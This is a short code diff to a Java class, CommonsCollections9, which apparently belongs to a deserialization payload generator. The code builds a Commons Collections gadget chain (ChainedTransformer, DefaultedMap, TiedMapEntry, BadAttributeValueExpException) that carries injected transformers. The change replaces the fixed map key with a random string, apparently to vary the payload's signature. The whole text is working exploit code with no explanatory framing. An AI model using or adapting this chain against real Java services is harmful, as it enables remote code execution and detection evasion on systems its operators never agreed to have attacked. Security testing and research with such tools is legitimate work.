@@ -8,6 +8,7 @@ import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.Sink;
+import com.ppp.utils.RanDomUtils;
 import com.ppp.utils.Reflections;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
@@ -40,12 +41,14 @@ public class CommonsCollections9 implements ObjectPayload<Object> {
     }
 
     public Object getChain(Object transformers) throws Exception {
+        String s = RanDomUtils.generateRandomString(1);
+
         final Transformer transformerChain = new ChainedTransformer(
                 new Transformer[]{new ConstantTransformer(1)});
 
         Map<Object, Object> innerMap = new HashMap<Object, Object>();
         Map defaultedmap = DefaultedMap.decorate(innerMap, transformerChain);
-        TiedMapEntry entry = new TiedMapEntry(defaultedmap, "x");
+        TiedMapEntry entry = new TiedMapEntry(defaultedmap, s);
 
         Object val = KickOff.badAttributeValueExpException(entry);
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
